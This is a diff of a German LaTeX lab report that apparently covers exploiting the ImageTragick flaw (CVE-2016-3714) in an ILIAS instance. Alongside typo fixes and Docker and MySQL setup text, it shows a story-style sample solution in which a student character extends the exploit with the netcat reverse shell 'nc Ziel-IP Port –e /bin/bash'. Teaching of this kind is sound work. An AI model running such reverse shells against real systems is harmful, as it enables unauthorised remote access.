@@ -281,7 +281,7 @@
     Es wird ein command-line Interface, sowie APIs für die Integration in eigene Softwareprojekte bereitgestellt.
     Die Software bietet dabei einen großen Umfang an Funktionen und unterstützt eine Vielzahl an gängigen Dateiformaten, weshalb sie eine große Nutzerschaft in Bereichen wie der Webentwicklung, wissenschaftlichen Forschung, medizinischen Bildgebung und vielen weiteren aufweisen kann.
     Eine der wichtigsten Funktionen, die ImageMagick zu bieten hat, ist das Verarbeiten von Skripten und die Möglichkeit zur Automatisierung.
-    Immer gleich Abläufe für eine Großzahl an Bildern können so vereinfacht werde, weshalb die Software auch in Ilias eingesetzt wird~\parencite{imagemagick}.
+    Immer gleiche Abläufe für eine Großzahl an Bildern können so vereinfacht werden, weshalb die Software auch in ILIAS eingesetzt wird~\parencite{imagemagick}.
 
 
     \subsubsection{CVE-2016-3714 (ImageTragick)}
@@ -364,22 +364,34 @@
 
     \subsection{Docker}
     \label{subsec:docker}
-    Docker ist eine Open-Source-Plattform, die es Entwicklern ermöglicht, Anwendungen in Containern zu erstellen, zu verpacken und auszuführen.\n 
-    Container sind eigenständige und isolierte Einheiten, die alle erforderlichen Abhängigkeiten enthalten, um Anwendungen auf verschiedenen Systemen konsistent auszuführen.\autocite{docker}
-    \n Theoretisch stellt der User \glqq sturai\grqq\ ein ILIAS-Image über Docker Hub bereit (\href{https://hub.docker.com/r/sturai/ilias#!}{s. hier}).
-    Jedoch konnten wir dieses nicht benutzen, da die angebotenen Versionen unsere Exploits nicht mehr unterstützen beziehungsweise diese darin behoben sind.\n
-    Unsere Lösung
+    Docker ist eine Open-Source-Plattform, die es Entwicklern ermöglicht, Anwendungen in Containern zu erstellen, zu verpacken und auszuführen.
+    Container sind eigenständige und isolierte Einheiten, die alle erforderlichen Abhängigkeiten enthalten, um Anwendungen auf verschiedenen Systemen konsistent auszuführen.\parencite{docker}
+    Theoretisch stellt der User \glqq sturai\grqq\ ein ILIAS-Image über Docker Hub bereit (\href{https://hub.docker.com/r/sturai/ilias#!}{s. hier}).
+    Jedoch konnten wir dieses nicht benutzen, da die angebotenen Versionen unsere Exploits nicht mehr unterstützen beziehungsweise diese darin behoben sind.
+    Unsere einzige Möglichkeit war somit ein eigenes Docker Image zu erstellen. Wir haben jedoch als Basis hierfür das Image von \glqq sturai\grqq\ genutzt.
+    Um nun die Dependencies korrekt anzupassen, haben wir uns auf der \href{https://docu.ilias.de/goto_docu_lm_367.html}{ILIAS-Supportpage} die Requirementstabelle angeschaut und die Dependencies, wie dort genannt, konfiguriert.
+    Damit ILIAS korrekt gebuildet werden kann, benötigen wir jedoch noch eine Install- und eine Entrypoint-Datei \parencite{dockerEntrypoints}.
+    Auch hier haben wir als Basis die Dateien von \glqq sturai\grqq\ genutzt und diese überarbeitet, sodass unsere ILIAS-Version unterstützt wird.
+    Zu guter Letzt mussten wir noch die docker-compose.yml anpasssen, sodass unsere lokalen Dateien und Images genutzt werden, um den Container zu erstellen.
+
     \subsection{VM mit einem Ubuntu Betriebssystem}
     \label{subsec:ubuntu}
 
     \subsection{MySQL Datenbank}
     \label{subsec:mysqlDatenbank}
+    \href{https://www.mysql.com/}{MySQL} ist ein Open-Source-relationales Datenbankverwaltungssystem (RDBMS), das effiziente Speicherung, Verwaltung und Abfrage großer Datenmengen ermöglicht.
+    Es organisiert Daten in Tabellen mit Zeilen und Spalten, bietet hohe Geschwindigkeit und Leistung, Skalierbarkeit für wachsende Datenmengen, Mehrbenutzerfähigkeit und Sicherheitsfunktionen.
+    MySQL wird in einer Vielzahl von Anwendungen eingesetzt und ist besonders beliebt für Webanwendungen, Content-Management-Systeme, E-Commerce-Plattformen und Datenanalyse.
+    Da auch unsere ILIAS-Instanz eine Datenbank benötigt, wo wir benötigte Bild-, User- und sonstige Dateien abspeichern können.
 
     \subsection{Apache Server mit einem Debian Betriebssystem}
-    \label{subsec:apacherServer}
+    \label{subsec:apacheServer}
 
     \subsection{ILIAS mit ImageMagick}
     \label{subsec:iliasTechnologie}
+    
+    \subsection{Selenium}
+    \label{subsec:selenium}
 
 
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
@@ -429,7 +441,7 @@
     \section{Musterlösung}
     \label{sec:musterloesung}
 
-    \subsection{Virtuelle Maschine 1}
+    \subsection{Virtuelle Maschine 1} %Freddy
     \label{subsec:vm1}
 
     \subsection{Virtuelle Maschine 2}
@@ -460,7 +472,7 @@
     \end{figure}
 
     \noindent
-    Er hatte vor kurzem etwas über ImageTragic gelesen.
+    Er hatte vor kurzem etwas über ImageTragick gelesen.
     Und wie so oft, bietet \href{https://www.exploit-db.com/exploits/39767}{\textbf{exlpoit-db}} direkt die richtigen Informationen.
 
     \vspace{0.4cm}
@@ -474,11 +486,11 @@
     \end{lstlisting}~\parencite{imagemagickExploit}
     \vspace{0.3cm}
     \\
-    Dieser Exlpoit zeigt nach dem Ausführen eine Liste aller Dateien und Verzeichnisse im aktuellen Verzeichnis als Profilbild an.
+    Dieser Exploit zeigt nach dem Ausführen eine Liste aller Dateien und Verzeichnisse im aktuellen Verzeichnis als Profilbild an.
     Das ist Tim jedoch nicht genug, er möchte eine Reverse Shell.
     Hacking \textcite{reverseShell} zeigt ein Beispiel für eine Netcat Reverse Shell: \textit{nc Ziel-IP Port –e /bin/bash}.
     Es gilt abschließend den in~\ref{lst:imageMagickExploit} beschriebene Exploit um die Netcat Reverse Shell ergänzen.
-    Das der Exploit ausgeführt wird, ist darauf zurückzuführen, dass ImageMagick versucht das Dateiformat anhand des Inhalts festzustellen.
+    Dass der Exploit ausgeführt wird, ist darauf zurückzuführen, dass ImageMagick versucht das Dateiformat anhand des Inhalts festzustellen.
     \vspace{0.4cm}
     \begin{lstlisting}[label={lst:imageMagickExploitFinal}]
         #Als .txt bearbeiten und in einem akzeptiertem Dateiformat speichern
@@ -618,7 +630,7 @@
 
     \vspace{0.3cm}
     \noindent
-    TimDerHackerboy hat es mal wieder bewiesen, er trägt den Spitznamen Hackerboy nicht um sonst.
+    TimDerHackerboy hat es mal wieder bewiesen. Er trägt den Spitznamen Hackerboy nicht um sonst.
     Ob ihm Professor SuperSicher Andi auf die Schliche kommt, das bleibt abzuwarten.
 
 
